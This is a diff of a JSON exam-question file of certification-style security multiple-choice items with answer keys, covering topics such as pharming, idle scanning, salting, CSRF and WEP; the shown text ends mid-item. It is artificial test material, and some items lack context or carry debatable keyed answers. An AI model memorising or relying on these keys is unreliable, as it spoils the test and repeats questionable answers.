@@ -3061,490 +3061,490 @@
   },
   {
     "id": 91,
-    [cite_start]"question": "Johnny decided to gather information for identity theft from the target organization. He wants to redirect the organization's web traffic to a malicious website. After some thought, he plans to perform DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and wants to modify the original IP address of the target website to that of a malicious website. Which of the following techniques does Johnny plan to use? [cite: 2074, 2075, 2076, 2077, 2078, 2079]",
+    "question": "Johnny decided to gather information for identity theft from the target organization. He wants to redirect the organization's web traffic to a malicious website. After some thought, he plans to perform DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and wants to modify the original IP address of the target website to that of a malicious website. Which of the following techniques does Johnny plan to use? [cite: 2074, 2075, 2076, 2077, 2078, 2079]",
     "category": "Social Engineering",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Pretexting [cite: 2080]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Pharming [cite: 2081]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Skimming [cite: 2082]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Wardriving [cite: 2083]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Pretexting [cite: 2080]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Pharming [cite: 2081]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Skimming [cite: 2082]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Wardriving [cite: 2083]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 92,
-    "question": "You have successfully executed the attack and launched the shell on the target network. Now you want to identify all the OS of machines running on this network. You are trying to run the Nmap command to perform this task and see the following: hackeduser@hackedserver.~$ nmap -T4-0 192.168.0.0/24. TCP/IP fingerprinting (for OS scan) xxxxXXX XXXXXX XXXXXXXXX. QUITTING! [cite_start]Why couldn't the scan be performed? [cite: 2119, 2120, 2121, 2122, 2123, 2124]",
+    "question": "You have successfully executed the attack and launched the shell on the target network. Now you want to identify all the OS of machines running on this network. You are trying to run the Nmap command to perform this task and see the following: hackeduser@hackedserver.~$ nmap -T4-0 192.168.0.0/24. TCP/IP fingerprinting (for OS scan) xxxxXXX XXXXXX XXXXXXXXX. QUITTING! Why couldn't the scan be performed? [cite: 2119, 2120, 2121, 2122, 2123, 2124]",
     "category": "Scanning",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "The shell is not stabilized. [cite: 2125]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "OS Scan requires root privileges. [cite: 2126]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "The nmap syntax is wrong. [cite: 2126]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "The outgoing TCP/IP fingerprinting is blocked by the host firewall. [cite: 2127]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "The shell is not stabilized. [cite: 2125]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "OS Scan requires root privileges. [cite: 2126]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "The nmap syntax is wrong. [cite: 2126]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "The outgoing TCP/IP fingerprinting is blocked by the host firewall. [cite: 2127]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 93,
-    "question": "Your company has decided to purchase a subscription to a cloud-hosted solution. After purchasing this solution, the only administrative task of your employees will be the management of user accounts. The provider will cover all hardware, operating system, and software administration (including patching and monitoring). [cite_start]Which of the following is this type of solution? [cite: 2132, 2133, 2134, 2135]",
+    "question": "Your company has decided to purchase a subscription to a cloud-hosted solution. After purchasing this solution, the only administrative task of your employees will be the management of user accounts. The provider will cover all hardware, operating system, and software administration (including patching and monitoring). Which of the following is this type of solution? [cite: 2132, 2133, 2134, 2135]",
     "category": "Cloud Computing",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "SaaS [cite: 2136]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "PaaS [cite: 2137]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "CaaS [cite: 2138]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "IaaS [cite: 2139]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "SaaS [cite: 2136]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "PaaS [cite: 2137]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "CaaS [cite: 2138]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "IaaS [cite: 2139]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 94,
-    [cite_start]"question": "Which of the following is the firewall evasion scanning technique that uses a zombie system with low network activity? [cite: 2182, 2183]",
+    "question": "Which of the following is the firewall evasion scanning technique that uses a zombie system with low network activity? [cite: 2182, 2183]",
     "category": "Scanning",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Spoof source address scanning [cite: 2184]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Decoy scanning [cite: 2185]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Idle scanning [cite: 2186]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Packet fragmentation scanning [cite: 2187]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Spoof source address scanning [cite: 2184]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Decoy scanning [cite: 2185]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Idle scanning [cite: 2186]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Packet fragmentation scanning [cite: 2187]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 95,
-    "question": "He accesses the contents of MIB by using a web browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. You know that your subordinate can retrieve information from a MIB that contains object types for workstations and server services. [cite_start]Which of the following types of MIB will your subordinate use to retrieve information about types for workstations and server services? [cite: 2212, 2213, 2214]",
+    "question": "He accesses the contents of MIB by using a web browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. You know that your subordinate can retrieve information from a MIB that contains object types for workstations and server services. Which of the following types of MIB will your subordinate use to retrieve information about types for workstations and server services? [cite: 2212, 2213, 2214]",
     "category": "Enumeration",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "WINS.MIB [cite: 2215]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "DHCP.MIB [cite: 2216]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "LNMIB2.MIB [cite: 2217]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "MIB II.MIB [cite: 2218]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "WINS.MIB [cite: 2215]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "DHCP.MIB [cite: 2216]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "LNMIB2.MIB [cite: 2217]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "MIB II.MIB [cite: 2218]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 96,
-    "question": "You decide to use a user-defined HTTP callback or push APIs that are raised based on trigger events. When this feature invokes, data is supplied to other applications so that users can instantly receive real-time information. [cite_start]What is the name of this technique? [cite: 2231, 2232, 2233, 2234]",
+    "question": "You decide to use a user-defined HTTP callback or push APIs that are raised based on trigger events. When this feature invokes, data is supplied to other applications so that users can instantly receive real-time information. What is the name of this technique? [cite: 2231, 2232, 2233, 2234]",
     "category": "Application Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Webhooks [cite: 2235]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Web shells [cite: 2236]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "SOAP API [cite: 2237]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "REST API [cite: 2238]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Webhooks [cite: 2235]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Web shells [cite: 2236]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "SOAP API [cite: 2237]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "REST API [cite: 2238]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 97,
-    [cite_start]"question": "Which category does the telecom company fall in the above scenario according to NIST cloud deployment reference architecture? [cite: 2245, 2246]",
+    "question": "Which category does the telecom company fall in the above scenario according to NIST cloud deployment reference architecture? [cite: 2245, 2246]",
     "category": "Cloud Computing",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Cloud consumer [cite: 2247]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Cloud carrier [cite: 2248]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Cloud broker [cite: 2249]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Cloud auditor [cite: 2250]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Cloud consumer [cite: 2247]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Cloud carrier [cite: 2248]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Cloud broker [cite: 2249]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Cloud auditor [cite: 2250]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 98,
-    "question": "Ron, the hacker, is trying to crack an employee's password of the target organization utilizing a rainbow table. During the break-in, he discovered that upon entering a password that extra characters are added to the password after submitting. [cite_start]Which of the following countermeasures is the target company using to protect against rainbow tables? [cite: 2270, 2271, 2272]",
+    "question": "Ron, the hacker, is trying to crack an employee's password of the target organization utilizing a rainbow table. During the break-in, he discovered that upon entering a password that extra characters are added to the password after submitting. Which of the following countermeasures is the target company using to protect against rainbow tables? [cite: 2270, 2271, 2272]",
     "category": "Cryptography",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Password salting [cite: 2274]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Password hashing [cite: 2275]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Password key hashing [cite: 2276]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Account lockout [cite: 2277]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Password salting [cite: 2274]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Password hashing [cite: 2275]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Password key hashing [cite: 2276]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Account lockout [cite: 2277]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 99,
-    "question": "Firstly the attacker obtains a valid session ID by logging into a service and later feeds the same session ID to the victim. The session ID links the victim to the attacker's account page without disclosing any information to the victim. Then the attacker waits until the victim clicks on the link, and after this, the sensitive payment details entered in a form are linked to the attacker's account. [cite_start]Which of the following attacks was the attacker performing? [cite: 2291, 2292, 2293, 2294]",
+    "question": "Firstly the attacker obtains a valid session ID by logging into a service and later feeds the same session ID to the victim. The session ID links the victim to the attacker's account page without disclosing any information to the victim. Then the attacker waits until the victim clicks on the link, and after this, the sensitive payment details entered in a form are linked to the attacker's account. Which of the following attacks was the attacker performing? [cite: 2291, 2292, 2293, 2294]",
     "category": "Session Hijacking",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Session fixation [cite: 2295]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "CRIME [cite: 2296]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Session donation [cite: 2297]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Forbidden [cite: 2297]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Session fixation [cite: 2295]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "CRIME [cite: 2296]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Session donation [cite: 2297]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Forbidden [cite: 2297]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 100,
-    [cite_start]"question": "Which of the following is API designed to reduce complexity and increase the integrity of updating and changing which uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application? [cite: 2317, 2318]",
+    "question": "Which of the following is API designed to reduce complexity and increase the integrity of updating and changing which uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application? [cite: 2317, 2318]",
     "category": "Application Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "REST API [cite: 2319]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "JSON-RPC [cite: 2320]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "RESTful API [cite: 2321]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "SOAP API [cite: 2322]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "REST API [cite: 2319]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "JSON-RPC [cite: 2320]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "RESTful API [cite: 2321]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "SOAP API [cite: 2322]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 101,
-    [cite_start]"question": "Which of the following is a vulnerability in which the malicious person forces the user's browser to send an authenticated request to a server? [cite: 2360, 2361]",
+    "question": "Which of the following is a vulnerability in which the malicious person forces the user's browser to send an authenticated request to a server? [cite: 2360, 2361]",
     "category": "Web Application Attacks",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Cross-site request forgery [cite: 2362]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Cross-site scripting [cite: 2363]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Server-side request forgery [cite: 2364]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Session hijacking [cite: 2365]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Cross-site request forgery [cite: 2362]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Cross-site scripting [cite: 2363]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Server-side request forgery [cite: 2364]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Session hijacking [cite: 2365]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 102,
-    "question": "The attacker created a fake account on a dating site and wrote to John with an offer to get acquainted. Fake profile photos enthralled John, and he initiated a conversation with the attacker's fake account. After a few hours of communication, the attacker began asking about his company and eventually gathered all the essential information about the target company. [cite_start]What is the social engineering technique the attacker used in this scenario? [cite: 2392, 2393, 2394, 2395, 2396]",
+    "question": "The attacker created a fake account on a dating site and wrote to John with an offer to get acquainted. Fake profile photos enthralled John, and he initiated a conversation with the attacker's fake account. After a few hours of communication, the attacker began asking about his company and eventually gathered all the essential information about the target company. What is the social engineering technique the attacker used in this scenario? [cite: 2392, 2393, 2394, 2395, 2396]",
     "category": "Social Engineering",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Baiting [cite: 2398]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Piggybacking [cite: 2399]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Honey trap [cite: 2400]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Diversion theft [cite: 2401]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Baiting [cite: 2398]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Piggybacking [cite: 2399]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Honey trap [cite: 2400]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Diversion theft [cite: 2401]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 103,
-    [cite_start]"question": "Which of the following encryption algorithms is a symmetric key block cipher that has a 128-bit block size, and its key size can be up to 256 bits? [cite: 2419, 2420]",
+    "question": "Which of the following encryption algorithms is a symmetric key block cipher that has a 128-bit block size, and its key size can be up to 256 bits? [cite: 2419, 2420]",
     "category": "Cryptography",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Twofish [cite: 2421]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "HMAC [cite: 2422]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Blowfish [cite: 2423]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "IDEA [cite: 2424]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Twofish [cite: 2421]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "HMAC [cite: 2422]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Blowfish [cite: 2423]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "IDEA [cite: 2424]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 104,
-    "question": "You have been assigned to find and install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. [cite_start]Which of the following tools will you use to accomplish this task? [cite: 2453, 2454]",
+    "question": "You have been assigned to find and install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools will you use to accomplish this task? [cite: 2453, 2454]",
     "category": "OT Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Robotium [cite: 2455]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "IntentFuzzer [cite: 2456]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Balena Cloud [cite: 2457]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Flowmon [cite: 2458]", "isCorrect": true, "justification": null, "image": null }
+      { "text": "Robotium [cite: 2455]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "IntentFuzzer [cite: 2456]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Balena Cloud [cite: 2457]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Flowmon [cite: 2458]", "isCorrect": true, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 105,
-    "question": "Jan 3, 2020, 9:18:35 AM 10.240.212.18-54373 10.202.206.19-22 tcp_ip. [cite_start]Based on this log, which of the following is true? [cite: 2472, 2473, 2474]",
+    "question": "Jan 3, 2020, 9:18:35 AM 10.240.212.18-54373 10.202.206.19-22 tcp_ip. Based on this log, which of the following is true? [cite: 2472, 2473, 2474]",
     "category": "Log Analysis",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "SSH communications are encrypted; it's impossible to know who is the client or the server. [cite: 2475]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Application is FTP and 10.240.212.18 is the client and 10.202.206.19 is the server. [cite: 2476, 2477]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Application is SSH and 10.240.212.18 is the server and 10.202.206.19 is the client. [cite: 2478]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the server. [cite: 2479]", "isCorrect": true, "justification": null, "image": null }
+      { "text": "SSH communications are encrypted; it's impossible to know who is the client or the server. [cite: 2475]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Application is FTP and 10.240.212.18 is the client and 10.202.206.19 is the server. [cite: 2476, 2477]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Application is SSH and 10.240.212.18 is the server and 10.202.206.19 is the client. [cite: 2478]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the server. [cite: 2479]", "isCorrect": true, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 106,
-    "question": "When performing this attack, an attacker installs a fake communication tower between two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the data transmission between the user and the real tower, attempting to hijack an active session. After that, the attacker receives the user's request and can manipulate the virtual tower traffic and redirect a victim to a malicious website. [cite_start]Identify the attack. [cite: 2488, 2489, 2490, 2491]",
+    "question": "When performing this attack, an attacker installs a fake communication tower between two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the data transmission between the user and the real tower, attempting to hijack an active session. After that, the attacker receives the user's request and can manipulate the virtual tower traffic and redirect a victim to a malicious website. Identify the attack. [cite: 2488, 2489, 2490, 2491]",
     "category": "Mobile Security",
     "image": "",
     "answers": [
-      [cite_start]{ "text": "Jamming signal attack [cite: 2492]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "aLTEr attack [cite: 2493]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "KRACK attack [cite: 2493]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Wardriving [cite: 2494]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Jamming signal attack [cite: 2492]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "aLTEr attack [cite: 2493]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "KRACK attack [cite: 2493]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Wardriving [cite: 2494]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 107,
-    "question": "Your boss informed you that a problem was detected in the service running on port 389 and said that you must fix this problem as soon as possible. [cite_start]What service is running on this port, and how can you fix this problem? [cite: 2518, 2519, 2520]",
+    "question": "Your boss informed you that a problem was detected in the service running on port 389 and said that you must fix this problem as soon as possible. What service is running on this port, and how can you fix this problem? [cite: 2518, 2519, 2520]",
     "category": "Network Security",
     "image": null,
     "answers": [
-      { "text": "The service is LDAP. [cite_start]You must change it to 636, which is LDAPS. [cite: 2521, 2522]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "The findings do not require immediate actions and are only suggestions. [cite: 2522]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "The service is NTP, and you have to change it from UDP to TCP to encrypt it. [cite: 2523]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails. [cite: 2524]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "The service is LDAP. You must change it to 636, which is LDAPS. [cite: 2521, 2522]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "The findings do not require immediate actions and are only suggestions. [cite: 2522]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "The service is NTP, and you have to change it from UDP to TCP to encrypt it. [cite: 2523]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails. [cite: 2524]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 108,
-    "question": "He decides to use the tool to track the target's emails and collect information such as senders' identities, mail servers, sender IP addresses, and sender locations from different public sources. It also checks email addresses for leaks using haveibeenpwned.com API. [cite_start]Which of the following tools is used by the attacker? [cite: 2536, 2537, 2538]",
+    "question": "He decides to use the tool to track the target's emails and collect information such as senders' identities, mail servers, sender IP addresses, and sender locations from different public sources. It also checks email addresses for leaks using haveibeenpwned.com API. Which of the following tools is used by the attacker? [cite: 2536, 2537, 2538]",
     "category": "Reconnaissance",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Infoga [cite: 2539]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Netcraft [cite: 2540]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "ZoomInfo [cite: 2541]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Factiva [cite: 2542]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Infoga [cite: 2539]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Netcraft [cite: 2540]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "ZoomInfo [cite: 2541]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Factiva [cite: 2542]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 109,
-    "question": "The attacker is performing the footprinting process. He checks publicly available information about the target organization by using the Google search engine. [cite_start]Which of the following advanced operators will he use to restrict the search to the organization's web domain? [cite: 2561, 2562, 2563]",
+    "question": "The attacker is performing the footprinting process. He checks publicly available information about the target organization by using the Google search engine. Which of the following advanced operators will he use to restrict the search to the organization's web domain? [cite: 2561, 2562, 2563]",
     "category": "Reconnaissance",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "[link:] [cite: 2564]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "[site:] [cite: 2565]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "[location:] [cite: 2566]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "[allinurl:] [cite: 2567]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "[link:] [cite: 2564]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "[site:] [cite: 2565]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "[location:] [cite: 2566]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "[allinurl:] [cite: 2567]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 110,
-    "question": "Justin, the evil hacker, wants to steal Joanna's data. He sends Joanna an email with a malicious link that looks legitimate. Joanna unknowingly clicks on the link, and it redirects her to a malicious web page, and John steals Joanna's data. [cite_start]Which of the following attacks is described in this scenario? [cite: 2579, 2580, 2581, 2582]",
+    "question": "Justin, the evil hacker, wants to steal Joanna's data. He sends Joanna an email with a malicious link that looks legitimate. Joanna unknowingly clicks on the link, and it redirects her to a malicious web page, and John steals Joanna's data. Which of the following attacks is described in this scenario? [cite: 2579, 2580, 2581, 2582]",
     "category": "Social Engineering",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Vishing [cite: 2583]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Phishing [cite: 2584]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Spoofing [cite: 2585]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "DDoS [cite: 2586]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Vishing [cite: 2583]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Phishing [cite: 2584]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Spoofing [cite: 2585]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "DDoS [cite: 2586]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 111,
-    "question": "While checking your organization's wireless network, you found that the wireless network component is not sufficiently secure. It uses an old encryption protocol designed to mimic wired encryption. [cite_start]Which of the following protocols is used in your organization's wireless network? [cite: 2606, 2607, 2608, 2609]",
+    "question": "While checking your organization's wireless network, you found that the wireless network component is not sufficiently secure. It uses an old encryption protocol designed to mimic wired encryption. Which of the following protocols is used in your organization's wireless network? [cite: 2606, 2607, 2608, 2609]",
     "category": "Wireless Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "WEP [cite: 2610]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "WPA3 [cite: 2611]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "RADIUS [cite: 2612]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "WPA [cite: 2613]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "WEP [cite: 2610]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "WPA3 [cite: 2611]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "RADIUS [cite: 2612]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "WPA [cite: 2613]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 112,
-    [cite_start]"question": "Which of the following is a cloud solution option where a customer can join with a group of users or organizations to share a cloud environment? [cite: 2627, 2628]",
+    "question": "Which of the following is a cloud solution option where a customer can join with a group of users or organizations to share a cloud environment? [cite: 2627, 2628]",
     "category": "Cloud Computing",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Private [cite: 2629]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Hybrid [cite: 2630]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Community [cite: 2631]", "isCorrect": true, "justification": null, "image": null },
